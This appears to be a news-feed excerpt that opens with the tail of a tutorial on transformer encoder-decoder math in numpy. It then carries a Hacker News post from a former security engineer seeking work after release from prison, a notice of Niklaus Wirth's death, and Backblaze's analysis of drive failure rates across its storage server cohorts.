<li>We have the <strong>encoder</strong>, which takes the input sequence and generates its rich representation. It‚Äôs composed of a stack of encoder blocks.</li>
<li>We have the <strong>decoder</strong>, which takes the encoder output and generated tokens, and generates the output sequence. It‚Äôs composed of a stack of decoder blocks.</li>
</ul>
<p>How do we go from the decoder‚Äôs output to a word? We need to add a final linear layer and a softmax layer on top of the decoder. The whole algorithm looks like this:</p>
<ol type="1">
<li>The encoder receives the input sequence and generates a representation of it.</li>
<li>The decoder begins with the SOS token and the encoder output. It generates the next token of the output sequence.</li>
<li>We then apply a linear layer to generate the logits.</li>
<li>We then apply a softmax layer to generate the probabilities.</li>
<li>The decoder uses the encoder output and the previously generated token to generate the next token of the output sequence.</li>
<li>We repeat steps 2-5 until we generate the EOS token.</li>
</ol>
<p>This is mentioned in the section 3.4 of the paper.</p>
<section id="linear-layer">
<h3 data-anchor-id="linear-layer">1. Linear layer</h3>
<p>The linear layer is a simple linear transformation. It takes the decoder‚Äôs output and transforms it into a vector of size <code>vocab_size</code>. This is the size of the vocabulary. For example, if we have a vocabulary of 10000 words, the linear layer will transform the decoder‚Äôs output into a vector of size 10000. This vector will contain the probability of each word being the next word in the sequence. For simplicity, let‚Äôs go with a vocabulary of 10 words and assume the first decoder output is a very simple vector: [1, 0, 1, 0]. We‚Äôll use random weights and biases matrices of the size <code>vocab_size</code> x <code>decoder_output_size</code>.</p>
<div>
<div id="cb67"><pre><code><span id="cb67-1"><span>def</span> linear(x, W, b):</span>
<span id="cb67-2">    <span>return</span> np.dot(x, W) <span>+</span> b</span>
<span id="cb67-3"></span>
<span id="cb67-4">x <span>=</span> linear([[<span>1</span>, <span>0</span>, <span>1</span>, <span>0</span>]], np.random.randn(<span>4</span>, <span>10</span>), np.random.randn(<span>10</span>))</span>
<span id="cb67-5">x</span></code></pre></div>
<div>
<pre><code>array([[-0.39929948,  0.96345013,  2.77090264,  0.25651866, -0.84738762,
        -1.67834992, -0.29583529, -3.55515281,  2.97453801, -1.10682376]])</code></pre>
</div>
</div>
</section>
<section id="softmax">
<h3 data-anchor-id="softmax">2. Softmax</h3>
<p>These are called logits but they are not easily interpretable. We need to apply a softmax function to obtain the probabilities.</p>
<div>
<pre><code>array([[0.01602618, 0.06261303, 0.38162024, 0.03087794, 0.0102383 ,
        0.00446011, 0.01777314, 0.00068275, 0.46780959, 0.00789871]])</code></pre>
</div>
<p>This is giving us probabilities! Let‚Äôa assume the vocabulary is the following:</p>
<p><span>\[
\text{vocab} = \begin{bmatrix}
\text{hello} &amp; \text{mundo} &amp; \text{world} &amp; \text{how} &amp; \text{?} &amp; \text{EOS} &amp; \text{SOS} &amp; \text{a} &amp; \text{hola} &amp; \text{c}
\end{bmatrix}
\]</span></p>
<p>The above tells us that the probabilities are</p>
<ul>
<li>hello: 0.01602618</li>
<li>mundo: 0.06261303</li>
<li>world: 0.38162024</li>
<li>how: 0.03087794</li>
<li>?: 0.0102383</li>
<li>EOS: 0.00446011</li>
<li>SOS: 0.01777314</li>
<li>a: 0.00068275</li>
<li>hola: 0.46780959</li>
<li>c: 0.00789871</li>
</ul>
<p>From these, the most likely next token is ‚Äúhola‚Äù. Picking always the most likely token is called greedy decoding. This is not always the best approach, as it might lead to suboptimal results, but we won‚Äôt dive into generation techniques at the moment. If you want to learn more about it, check out this amazing <a href="https://huggingface.co/blog/how-to-generate">blog post</a>.</p>
</section>
<section id="the-random-encoder-decoder-transformer">
<h3 data-anchor-id="the-random-encoder-decoder-transformer">3. The Random Encoder-Decoder Transformer</h3>
<p>Let‚Äôs write the whole code for this! Let‚Äôs define a dictionary that maps the words to their initial embeddings. Note that this is also learned during training, but we‚Äôll use random values for now.</p>
<div>
<div id="cb71"><pre><code><span id="cb71-1">vocabulary <span>=</span> [</span>
<span id="cb71-2">    <span>"hello"</span>,</span>
<span id="cb71-3">    <span>"mundo"</span>,</span>
<span id="cb71-4">    <span>"world"</span>,</span>
<span id="cb71-5">    <span>"how"</span>,</span>
<span id="cb71-6">    <span>"?"</span>,</span>
<span id="cb71-7">    <span>"EOS"</span>,</span>
<span id="cb71-8">    <span>"SOS"</span>,</span>
<span id="cb71-9">    <span>"a"</span>,</span>
<span id="cb71-10">    <span>"hola"</span>,</span>
<span id="cb71-11">    <span>"c"</span>,</span>
<span id="cb71-12">]</span>
<span id="cb71-13">embedding_reps <span>=</span> np.random.randn(<span>10</span>, <span>1</span>, <span>4</span>)</span>
<span id="cb71-14">vocabulary_embeddings <span>=</span> {</span>
<span id="cb71-15">    word: embedding_reps[i] <span>for</span> i, word <span>in</span> <span>enumerate</span>(vocabulary)</span>
<span id="cb71-16">}</span>
<span id="cb71-17">vocabulary_embeddings</span></code></pre></div>
<div>
<pre><code>{'hello': array([[-1.19489531, -1.08007463,  1.41277762,  0.72054139]]),
 'mundo': array([[-0.70265064, -0.58361306, -1.7710761 ,  0.87478862]]),
 'world': array([[ 0.52480342,  2.03519246, -0.45100608, -1.92472193]]),
 'how': array([[-1.14693176, -1.55761929,  1.09607545, -0.21673596]]),
 '?': array([[-0.23689522, -1.12496841, -0.03733462, -0.23477603]]),
 'EOS': array([[ 0.5180958 , -0.39844119,  0.30004136,  0.03881324]]),
 'SOS': array([[ 2.00439161,  2.19477149, -0.84901634, -0.89269937]]),
 'a': array([[ 1.63558337, -1.2556952 ,  1.65365362,  0.87639945]]),
 'hola': array([[-0.5805717 , -0.93861149,  1.06847734, -0.34408367]]),
 'c': array([[-2.79741142,  0.70521986, -0.44929098, -1.66167776]])}</code></pre>
</div>
</div>
<p>And now let‚Äôs write our random <code>generate</code> method that generates tokens autorergressively.</p>
<div id="cb73"><pre><code><span id="cb73-1"><span>def</span> generate(input_sequence, max_iters<span>=</span><span>10</span>):</span>
<span id="cb73-2">    <span># We first encode the inputs into embeddings</span></span>
<span id="cb73-3">    <span># This skips the positional encoding step for simplicity</span></span>
<span id="cb73-4">    embedded_inputs <span>=</span> [</span>
<span id="cb73-5">        vocabulary_embeddings[token][<span>0</span>] <span>for</span> token <span>in</span> input_sequence</span>
<span id="cb73-6">    ]</span>
<span id="cb73-7">    <span>print</span>(<span>"Embedding representation (encoder input)"</span>, embedded_inputs)</span>
<span id="cb73-8"></span>
<span id="cb73-9">    <span># We then generate an embedding representation</span></span>
<span id="cb73-10">    encoder_output <span>=</span> encoder(embedded_inputs)</span>
<span id="cb73-11">    <span>print</span>(<span>"Embedding generated by encoder (encoder output)"</span>, encoder_output)</span>
<span id="cb73-12"></span>
<span id="cb73-13">    <span># We initialize the decoder output with the embedding of the start token</span></span>
<span id="cb73-14">    sequence <span>=</span> vocabulary_embeddings[<span>"SOS"</span>]</span>
<span id="cb73-15">    output <span>=</span> <span>"SOS"</span></span>
<span id="cb73-16"></span>
<span id="cb73-17">    <span># Random matrices for the linear layer</span></span>
<span id="cb73-18">    W_linear <span>=</span> np.random.randn(d_embedding, <span>len</span>(vocabulary))</span>
<span id="cb73-19">    b_linear <span>=</span> np.random.randn(<span>len</span>(vocabulary))</span>
<span id="cb73-20"></span>
<span id="cb73-21">    <span># We limit number of decoding steps to avoid too long sequences without EOS</span></span>
<span id="cb73-22">    <span>for</span> i <span>in</span> <span>range</span>(max_iters):</span>
<span id="cb73-23">        <span># Decoder step</span></span>
<span id="cb73-24">        decoder_output <span>=</span> decoder(sequence, encoder_output)</span>
<span id="cb73-25">        logits <span>=</span> linear(decoder_output, W_linear, b_linear)</span>
<span id="cb73-26">        probs <span>=</span> softmax(logits)</span>
<span id="cb73-27"></span>
<span id="cb73-28">        <span># We get the most likely next token</span></span>
<span id="cb73-29">        next_token <span>=</span> vocabulary[np.argmax(probs)]</span>
<span id="cb73-30"></span>
<span id="cb73-31">        sequence <span>=</span> vocabulary_embeddings[next_token]</span>
<span id="cb73-32">        output <span>+=</span> <span>" "</span> <span>+</span> next_token</span>
<span id="cb73-33"></span>
<span id="cb73-34">        <span>print</span>(</span>
<span id="cb73-35">            <span>"Iteration"</span>, i, </span>
<span id="cb73-36">            <span>"next token"</span>, next_token,</span>
<span id="cb73-37">            <span>"with probability of"</span>, np.<span>max</span>(probs),</span>
<span id="cb73-38">        )</span>
<span id="cb73-39"></span>
<span id="cb73-40">        <span># If the next token is the end token, we return the sequence</span></span>
<span id="cb73-41">        <span>if</span> next_token <span>==</span> <span>"EOS"</span>:</span>
<span id="cb73-42">            <span>return</span> output</span>
<span id="cb73-43"></span>
<span id="cb73-44">    <span>return</span> output</span></code></pre></div>
<p>Let‚Äôs run this now!</p>
<div>
<div id="cb74"><pre><code><span id="cb74-1">generate([<span>"hello"</span>, <span>"world"</span>])</span></code></pre></div>
<div>
<pre><code>Embedding representation (encoder input) [array([-1.19489531, -1.08007463,  1.41277762,  0.72054139]), array([ 0.52480342,  2.03519246, -0.45100608, -1.92472193])]
Embedding generated by encoder (encoder output) [[-0.15606365  0.90444064  0.82531037 -1.57368737]
 [-0.15606217  0.90443936  0.82531082 -1.57368802]]
Iteration 0 next token how with probability of 0.6265258176587956
Iteration 1 next token a with probability of 0.42708031743571
Iteration 2 next token c with probability of 0.44288777368698484</code></pre>
</div>

</div>
<p>Ok, so we got the tokens ‚Äúhow‚Äù, ‚Äúa‚Äù, and ‚Äúc‚Äù. This is not a good translation, but it‚Äôs expected! We only used random weights!</p>
<p>I suggest you to look again in detail at the whole encoder-decoder architecture from the original paper:</p>
<div>
<figure>
<p><img src="https://osanseviero.github.io/hackerllama/blog/posts/random_transformer/transformer.png"></p>
<figcaption>Encoder and decoder</figcaption>
</figure>
</div>
</section>
</section>
<section id="conclusions">
<h2 data-anchor-id="conclusions">Conclusions</h2>
<p>I hope that was fun and informational! We covered a lot of ground. Wait‚Ä¶was that it? And the answer is, mostly, yes! New transformer architectures add lots of tricks, but the core of the transformer is what we just covered. Depending on what task you want to solve, you can also only the encoder or the decoder. For example, for understanding-heavy tasks such as classification, you can use the encoder stack with a linear layer on top. For generation-heavy tasks such as translation, you can use the encoder and decoder stacks. And finally, for free generation, as in ChatGPT or Mistral, you can use only the decoder stack.</p>
<p>Of course, we also did lots of simplifications. Let‚Äôs briefly check which were the numbers in the original transformer paper:</p>
<ul>
<li>Embedding dimension: 512 (4 in our example)</li>
<li>Number of encoders: 6 (6 in our example)</li>
<li>Number of decoders: 6 (6 in our example)</li>
<li>Feed-forward dimension: 2048 (8 in our example)</li>
<li>Number of attention heads: 8 (2 in our example)</li>
<li>Attention dimension: 64 (3 in our example)</li>
</ul>
<p>We just covered lots of topics, but it‚Äôs quite interesting we can achieve impressive results by scaling up this math and doing smart training. We didn‚Äôt cover training in this blog post as the goal was to understand the math when using an existing model, but I hope this provided strong foundations for jumping into the training part. I hope you enjoyed this blog post!</p>
</section>
<section id="exercises">
<h2 data-anchor-id="exercises">Exercises</h2>
<p>Here are some exercises to practice your understanding of the transformer.</p>
<ol type="1">
<li>What is the purpose of the positional encoding?</li>
<li>How does self-attention and encoder-decoder attention differ?</li>
<li>What would happen if our attention dimension was too small? What about if it was too large?</li>
<li>Briefly describe the structure of a feed-forward layer.</li>
<li>Why is the decoder slower than the encoder?</li>
<li>What is the purpose of the residual connections and layer normalization?</li>
<li>How do we go from the decoder output to probabilities?</li>
<li>Why is picking the most likely next token every single time problematic?</li>
</ol>
</section>
<section id="resources">
<h2 data-anchor-id="resources">Resources</h2>
<ul>
<li><a href="http://jalammar.github.io/illustrated-transformer/">The Illustrated Transformer</a></li>
<li><a href="https://arxiv.org/abs/1706.03762">Attention is all you need</a></li>
<li><a href="http://nlp.seas.harvard.edu/2018/04/03/attention.html">The Annotated Transformer</a></li>
<li><a href="https://huggingface.co/learn/nlp-course/chapter1/1">Hugging Face free NLP course</a></li>
</ul>


</section>

</main> <!-- /main -->


</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[HNInternal: Ask HN: Any felons successfully found IT work post-release? (153 pts)]]></title>
            <link>https://news.ycombinator.com/item?id=38858075</link>
            <guid>38858075</guid>
            <pubDate>Wed, 03 Jan 2024 18:53:57 GMT</pubDate>
            <description><![CDATA[<p>See on <a href="https://news.ycombinator.com/item?id=38858075">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><td><table>
        <tbody><tr id="38858075">
      <td><span></span></td>      <td><center><a id="up_38858075" href="https://news.ycombinator.com/vote?id=38858075&amp;how=up&amp;goto=item%3Fid%3D38858075"></a></center></td><td><span><a href="https://news.ycombinator.com/item?id=38858075">Ask HN: Any felons successfully found IT work post-release?</a></span></td></tr><tr><td colspan="2"></td><td><span>
          <span id="score_38858075">118 points</span> by <a href="https://news.ycombinator.com/user?id=publicprivacy">publicprivacy</a> <span title="2024-01-03T18:53:57"><a href="https://news.ycombinator.com/item?id=38858075">3 hours ago</a></span> <span id="unv_38858075"></span> | <a href="https://news.ycombinator.com/hide?id=38858075&amp;goto=item%3Fid%3D38858075">hide</a> | <a href="https://hn.algolia.com/?query=Ask%20HN%3A%20Any%20felons%20successfully%20found%20IT%20work%20post-release%3F&amp;type=story&amp;dateRange=all&amp;sort=byDate&amp;storyText=false&amp;prefix&amp;page=0">past</a> | <a href="https://news.ycombinator.com/fave?id=38858075&amp;auth=8c85f0198b4de32032e47f550ab28e8b47c3e4ca">favorite</a> | <a href="https://news.ycombinator.com/item?id=38858075">100&nbsp;comments</a>        </span>
              </td></tr>
    <tr></tr><tr><td colspan="2"></td><td><div><p>Hello HN,</p><p>Does anyone have experience getting back into tech/startups post-felony?</p><p>I have been looking for work since I was released  for an assault charge in November 2022.</p><p>Previously I worked in Information Security as a SecOps Eng, most recently at Tinder. Between lack of recent job experience, and my record, I have been through a series of offer reneges, recruiters ghosting me, or going into HR resume black holes.</p><p>I am eager to get back into tech and feel like my old self adding value to a great team/org.</p><p>Anyone have leads on companies that are open to taking chances on good candidates with less than sparkling backgrounds?</p><p>NOTE: My offense was not computer/finance/fraud/selling drugs/physical violence/based at all.</p><p>Here is my linkedin:</p><p>https://www.linkedin.com/in/saunderscaleb/</p></div></td></tr>        <tr></tr><tr><td colspan="2"></td><td><form action="comment" method="post"></form></td></tr>  </tbody></table>
  </td></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Niklaus Wirth has died (1088 pts)]]></title>
            <link>https://twitter.com/Bertrand_Meyer/status/1742613897675178347</link>
            <guid>38858012</guid>
            <pubDate>Wed, 03 Jan 2024 18:50:12 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://twitter.com/Bertrand_Meyer/status/1742613897675178347">https://twitter.com/Bertrand_Meyer/status/1742613897675178347</a>, See on <a href="https://news.ycombinator.com/item?id=38858012">Hacker News</a></p>
Couldn't get https://twitter.com/Bertrand_Meyer/status/1742613897675178347: Error: Request failed with status code 400]]></description>
        </item>
        <item>
            <title><![CDATA[The drive stats of Backblaze storage pods (133 pts)]]></title>
            <link>https://www.backblaze.com/blog/the-drive-stats-of-backblaze-storage-pods/</link>
            <guid>38857396</guid>
            <pubDate>Wed, 03 Jan 2024 18:07:58 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.backblaze.com/blog/the-drive-stats-of-backblaze-storage-pods/">https://www.backblaze.com/blog/the-drive-stats-of-backblaze-storage-pods/</a>, See on <a href="https://news.ycombinator.com/item?id=38857396">Hacker News</a></p>
<div id="readability-page-1" class="page"><article aria-label="The Drive Stats of Backblaze Storage Pods" itemscope="" itemtype="https://schema.org/CreativeWork"><div itemprop="text">
<figure><img fetchpriority="high" decoding="async" width="1024" height="583" src="https://www.backblaze.com/blog/wp-content/uploads/2024/01/bb-bh-Server-Stats-1024x583.png" alt="A decorative image showing the Backblaze logo on a cloud over a pattern representing a network. " srcset="https://www.backblaze.com/blog/wp-content/uploads/2024/01/bb-bh-Server-Stats-1024x583.png 1024w, https://www.backblaze.com/blog/wp-content/uploads/2024/01/bb-bh-Server-Stats-300x171.png 300w, https://www.backblaze.com/blog/wp-content/uploads/2024/01/bb-bh-Server-Stats-768x437.png 768w, https://www.backblaze.com/blog/wp-content/uploads/2024/01/bb-bh-Server-Stats-560x319.png 560w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>

<p>Since 2009, Backblaze has <a href="https://www.backblaze.com/blog/petabytes-on-a-budget-how-to-build-cheap-cloud-storage/" target="_blank" rel="noreferrer noopener">written</a> <a href="https://www.backblaze.com/blog/petabytes-on-a-budget-v2-0revealing-more-secrets/" target="_blank" rel="noreferrer noopener">extensively</a> <a href="https://www.backblaze.com/blog/petabytes-on-a-budget-10-years-and-counting/" target="_blank" rel="noreferrer noopener">about</a> <a href="https://www.backblaze.com/blog/origins-of-the-pod/" target="_blank" rel="noreferrer noopener">the</a> <a href="https://www.backblaze.com/blog/open-source-data-storage-server/" target="_blank" rel="noreferrer noopener">data</a> <a href="https://www.backblaze.com/blog/the-storage-pod-story-innovation-to-commodity/" target="_blank" rel="noreferrer noopener">storage</a> <a href="https://www.backblaze.com/blog/next-backblaze-storage-pod/" target="_blank" rel="noreferrer noopener">servers</a> we created and deployed which we call <a href="https://www.backblaze.com/blog/category/cloud-storage/storage-pod/" target="_blank" rel="noreferrer noopener">Backblaze Storage Pods</a>. We not only wrote about our Storage Pods, we open sourced the design, published a parts list, and even provided instructions on how to build one. Many people did. Of the six storage pod versions we produced, four of them are still in operation in our data centers today. Over the last few years, we began using storage servers from Dell and, more recently, Supermicro, as they have proven to be economically and operationally viable in our environment.&nbsp;</p>
<p>Since 2013, we have also written extensively about our <a href="https://www.backblaze.com/blog/backblaze-drive-stats-for-q3-2023/" target="_blank" rel="noreferrer noopener">Drive Stats</a>, sharing reports on the failure rates of the HDDs and SSDs in our legion of storage servers. We have examined the drive failure rates by manufacturer, size, age, and so on, but we have never analyzed the drive failure rates of the storage servers‚Äîuntil now. Let‚Äôs take a look at the Drive Stats for our fleet of storage servers and see what we can learn.</p>
<h2>Storage Pods, Storage Servers, and Backblaze Vaults</h2>
<p>Let‚Äôs start with a few definitions:</p>
<ul>
<li><strong>Storage Server: </strong>A storage server is our generic name for a server from any manufacturer which we use to store customer data. We use storage servers from Backblaze, Dell, and Supermicro.</li>
<li><strong>Storage Pod: </strong>A Storage Pod is the name we gave to the storage servers Backblaze designed and had built for our data centers. The first Backblaze Storage Pod version was announced in September 2009. Subsequent versions are 2.0, 3.0, 4.0, 4.5, 5.0, 6.0, and 6.1. All but 6.1 were announced publicly.&nbsp;</li>
<li><strong>Backblaze Vault: </strong>A Backblaze Vault is 20 storage servers grouped together for the purpose of data storage. Uploaded data arrives at a given storage server within a Backblaze Vault and is <a href="https://www.backblaze.com/blog/reed-solomon/" target="_blank" rel="noreferrer noopener">encoded</a> into 20 parts with a given part being either a data blob or parity. Each of the 20 parts (shards) is then stored on one of the 20 storage servers.&nbsp;</li>
</ul>
<p>As you review the charts and tables here are a few things to know about Backblaze Vaults.</p>
<ul>
<li>There are currently six cohorts of storage servers in operation today: Supermicro, Dell, Backblaze 3.0, Backblaze 5.0, Backblaze 6.0, and Backblaze 6.1.</li>
<li>A given Vault will always be made up from one of the six cohorts of storage servers noted above. For example, Vault 1016 is made up of 20 Backblaze 5.0 Storage Pods and Vault 1176 is made of the 20 Supermicro servers.&nbsp;</li>
<li>A given Vault is made up of storage servers that contain the same number of drives as follows:
<ul>
<li>Dell servers: 26 drives.</li>
<li>Backblaze 3.0 and Backblaze 5.0 servers: 45 drives.</li>
<li>Backblaze 6.0, Backblaze 6.1, and Supermicro servers: 60 drives.</li>
</ul>
</li>
<li>All of the hard drives in a Backblaze Vault will be logically the same size; so, 16TB drives for example.</li>
</ul>
<h3>Drive Stats by Backblaze Vault Cohort</h3>
<p>With the background out of the way, let‚Äôs get started. As of the end of Q3 2023, there were a total of 241 Backblaze Vaults divided into the six cohorts, as shown in the chart below. The chart includes the server cohort, the number of Vaults in the cohort, and the percentage that cohort is of the total number of Vaults.</p>
<div>
<figure><a href="https://www.backblaze.com/blog/wp-content/uploads/2024/01/1-Breakdown-of-Vaults-Pie.png" data-rel="lightbox-gallery-ynFylTCA" data-rl_title="1 ‚Äì Breakdown of Vaults ‚Äì Pie" data-rl_caption="1 ‚Äì Breakdown of Vaults ‚Äì Pie" title="1 ‚Äì Breakdown of Vaults ‚Äì Pie"><img decoding="async" width="600" height="500" src="https://www.backblaze.com/blog/wp-content/uploads/2024/01/1-Breakdown-of-Vaults-Pie.png" alt="A pie chart showing the types of Backblaze Vaults by percentage. " srcset="https://www.backblaze.com/blog/wp-content/uploads/2024/01/1-Breakdown-of-Vaults-Pie.png 600w, https://www.backblaze.com/blog/wp-content/uploads/2024/01/1-Breakdown-of-Vaults-Pie-300x250.png 300w, https://www.backblaze.com/blog/wp-content/uploads/2024/01/1-Breakdown-of-Vaults-Pie-560x467.png 560w" sizes="(max-width: 600px) 100vw, 600px"></a></figure></div>

<p>Vaults consisting of Backblaze servers still comprise 68% of the vaults in use today (shaded from orange to red), although that number is dropping as older Vaults are being replaced with newer server models, typically the Supermicro systems.</p>
<p>The table below shows the Drive Stats for the different Vault cohorts identified above for Q3 2023.</p>
<div>
<figure><a href="https://www.backblaze.com/blog/wp-content/uploads/2024/01/2-Drive-Stats-by-vault.png" data-rel="lightbox-gallery-ynFylTCA" data-rl_title="2 ‚Äì Drive Stats by vault" data-rl_caption="2 ‚Äì Drive Stats by vault" title="2 ‚Äì Drive Stats by vault"><img decoding="async" width="660" height="380" src="https://www.backblaze.com/blog/wp-content/uploads/2024/01/2-Drive-Stats-by-vault.png" alt="A chart showing the Drive Stats for Backblaze Vaults. " srcset="https://www.backblaze.com/blog/wp-content/uploads/2024/01/2-Drive-Stats-by-vault.png 660w, https://www.backblaze.com/blog/wp-content/uploads/2024/01/2-Drive-Stats-by-vault-300x173.png 300w, https://www.backblaze.com/blog/wp-content/uploads/2024/01/2-Drive-Stats-by-vault-560x322.png 560w" sizes="(max-width: 660px) 100vw, 660px"></a></figure></div>

<p>The <strong>Avg Age (months)</strong> column is the average age of the drives, not the average age of the Vaults. The two may seem to be related, that‚Äôs not entirely the case. It is true the Backblaze 3.0 Vaults were deployed first followed in order by the 5.0 and 6.0 Vaults, but that‚Äôs where things get messy. There was some overlap between the Dell and Backblaze 6.1 deployments as the Dell systems were deployed in our central Europe data center, while the 6.1 Vaults continued to be deployed in the U.S. In addition, some migrations from the Backblaze 3.0 Vaults were initially done to 6.1 Vaults while we were also deploying new drives in the Supermicro Vaults.&nbsp;</p>
<p>The AFR for each of the server versions does not seem to follow any pattern or correlation to the average age of the drives. This was unexpected because, in general, <a href="https://www.backblaze.com/blog/drive-failure-over-time-the-bathtub-curve-is-leaking/" target="_blank" rel="noreferrer noopener">as drives pass about four years in age, they start to fail more often</a>. This should mean that Vaults with older drives, especially those with drives whose average age is over four years (48 months), should have a higher failure rate. But, as we can see, the Backblaze 5.0 Vaults defy that expectation.&nbsp;</p>
<p>To see if we can determine what‚Äôs going on, let‚Äôs expand on the previous table and dig into the different drive sizes that are in each Vault cohort, as shown in the table below.</p>
<div>
<figure><a href="https://www.backblaze.com/blog/wp-content/uploads/2024/01/3-Vaults-by-Server-and-Size.png" data-rel="lightbox-gallery-ynFylTCA" data-rl_title="3 ‚Äì Vaults by Server and Size" data-rl_caption="3 ‚Äì Vaults by Server and Size" title="3 ‚Äì Vaults by Server and Size"><img loading="lazy" decoding="async" width="720" height="750" src="https://www.backblaze.com/blog/wp-content/uploads/2024/01/3-Vaults-by-Server-and-Size.png" alt="A table showing Drive Stats by server version and drive size. " srcset="https://www.backblaze.com/blog/wp-content/uploads/2024/01/3-Vaults-by-Server-and-Size.png 720w, https://www.backblaze.com/blog/wp-content/uploads/2024/01/3-Vaults-by-Server-and-Size-288x300.png 288w, https://www.backblaze.com/blog/wp-content/uploads/2024/01/3-Vaults-by-Server-and-Size-560x583.png 560w" sizes="(max-width: 720px) 100vw, 720px"></a></figure></div>

<p><strong>Observations for Each Vault Cohort</strong></p>
<ul>
<li><strong>Backblaze 3.0: </strong>Obviously these Vaults have the oldest drives and, given their AFR is nearly twice the average for all of the drives (1.53%), it would make sense to migrate off of these servers. Of course the 6TB drives seem to be the exception, but at some point they will most likely ‚Äúhit the wall‚Äù and start failing.</li>
<li><strong>Backblaze 5.0:</strong> There are two Backblaze 5.0 drive sizes (4TB and 8TB) and the AFR for each is well below the average AFR for all of the drives (1.53%). The average age of the two drive sizes is nearly seven years or more. When compared to the Backblaze 6.0 Vaults, it would seem that migrating the 5.0 Vaults could wait, but there is an operational consideration here. The Backblaze 5.0 Vaults each contain 45 drives, and from the perspective of data density per system, they should be migrated to 60 drive servers sooner rather than later to optimize data center rack space.</li>
<li><strong>Backblaze 6.0:</strong> These Vaults as a group don‚Äôt seem to make any of the five different drive sizes happy. Only the AFR of the 4TB drives (1.42%) is just barely below the average AFR for all of the drives. The rest of the drive groups are well above the average.</li>
<li><strong>Backblaze 6.1:</strong> The 6.1 servers are similar to the 6.0 servers, but with an upgraded CPU and faster NIC cards. Is that why their annualized failure rates are much lower than the 6.0 systems? Maybe, but the drives in the 6.1 systems are also much younger, about half the age of those in the 6.0 systems, so we don‚Äôt have the full picture yet.</li>
<li><strong>Dell:</strong> The 14TB drives in the Dell Vaults seem to be a problem at a 5.46% AFR. Much of that is driven by two particular Dell vaults which have a high AFR, over 8% for Q3. This appears to be related to their location in the data center. All 40 of the Dell servers which make up these two Vaults were relocated to the top of 52U racks, and it appears that initially they did not like their new location. Recent data indicates they are doing much better, and we‚Äôll publish that data soon. We‚Äôll need to see what happens over the next few quarters. That said, if you remove these two Vaults from the Dell tally, the AFR is a respectable 0.99% for the remaining Vaults.</li>
<li><strong>Supermicro: </strong>This server cohort is mostly 16TB drives which are doing very well with an AFR of 0.62%. The one 14TB Vault is worth our attention with an AFR of 1.95%, and the 22TB Vault is too new to do any analysis.</li>
</ul>
<h3>Drive Stats by Drive Size and Vault Cohort</h3>
<p>Another way to look at the data is to take the previous table and re-sort it by drive size. Before we do that let‚Äôs establish the AFR for the different drive sizes aggregated over all Vaults.</p>
<div>
<figure><a href="https://www.backblaze.com/blog/wp-content/uploads/2024/01/4-AFR-by-Vault-and-Drive-Size-Bars.png" data-rel="lightbox-gallery-ynFylTCA" data-rl_title="4 ‚Äì AFR by Vault and Drive Size ‚Äì Bars" data-rl_caption="4 ‚Äì AFR by Vault and Drive Size ‚Äì Bars" title="4 ‚Äì AFR by Vault and Drive Size ‚Äì Bars"><img loading="lazy" decoding="async" width="570" height="430" src="https://www.backblaze.com/blog/wp-content/uploads/2024/01/4-AFR-by-Vault-and-Drive-Size-Bars.png" alt="A bar chart showing annualized failure rates for Backblaze Vaults by drive size. " srcset="https://www.backblaze.com/blog/wp-content/uploads/2024/01/4-AFR-by-Vault-and-Drive-Size-Bars.png 570w, https://www.backblaze.com/blog/wp-content/uploads/2024/01/4-AFR-by-Vault-and-Drive-Size-Bars-300x226.png 300w, https://www.backblaze.com/blog/wp-content/uploads/2024/01/4-AFR-by-Vault-and-Drive-Size-Bars-350x263.png 350w, https://www.backblaze.com/blog/wp-content/uploads/2024/01/4-AFR-by-Vault-and-Drive-Size-Bars-260x195.png 260w, https://www.backblaze.com/blog/wp-content/uploads/2024/01/4-AFR-by-Vault-and-Drive-Size-Bars-560x422.png 560w" sizes="(max-width: 570px) 100vw, 570px"></a></figure></div>

<p>As we can see in Q3 the 6TB and 22TB Vaults had zero failures (AFR = 0%). Also, the 10TB Vault is indeed only one Vault, so there are no other 10TB Vaults to compare it to. Given this, for readability, we will remove the 6TB, 10TB, and 22TB Vaults from the next table which compares how each drive size has fared in each of the six different Vault cohorts.</p>
<div>
<figure><a href="https://www.backblaze.com/blog/wp-content/uploads/2024/01/5-AFR-by-Drive-Size-and-Vaults.png" data-rel="lightbox-gallery-ynFylTCA" data-rl_title="5 ‚Äì AFR by Drive Size and Vaults" data-rl_caption="5 ‚Äì AFR by Drive Size and Vaults" title="5 ‚Äì AFR by Drive Size and Vaults"><img loading="lazy" decoding="async" width="720" height="650" src="https://www.backblaze.com/blog/wp-content/uploads/2024/01/5-AFR-by-Drive-Size-and-Vaults.png" alt="A table showing the annualized failure rates of servers by drive size and server version, not displaying the 6TB, 10TB, and 22TB Vaults. " srcset="https://www.backblaze.com/blog/wp-content/uploads/2024/01/5-AFR-by-Drive-Size-and-Vaults.png 720w, https://www.backblaze.com/blog/wp-content/uploads/2024/01/5-AFR-by-Drive-Size-and-Vaults-300x271.png 300w, https://www.backblaze.com/blog/wp-content/uploads/2024/01/5-AFR-by-Drive-Size-and-Vaults-560x506.png 560w" sizes="(max-width: 720px) 100vw, 720px"></a></figure></div>

<p>Currently we are migrating the 4TB drive Vaults to larger Vaults, replacing them with drives of 16TB and above. The migrations are done using an in-house system which we‚Äôll expand upon in a future post. The specific order of migrations is based on failure rates and durability of the existing 4TB Vaults with an eye towards removing the Backblaze 3.0 systems first as they are nearly 10 years old in some cases, and many of the non-drive replacement parts are no longer available. Whether we give away, <a href="https://www.backblaze.com/blog/megabot-vs-backblaze/" target="_blank" rel="noreferrer noopener">destroy</a>, or recycle the retired Backblaze 3.0 Storage Pods (sans drives) is still being debated.</p>
<p>For the 8TB drive Vaults, the Backblaze 5.0 Vaults are up first for migration when the time comes. Yes, their AFR is lower then the Backblaze 6.0 Vaults, but remember: the 5.0 Vaults are 45 drive units which are not as efficient storage density-wise versus the 60 drive systems.&nbsp;</p>
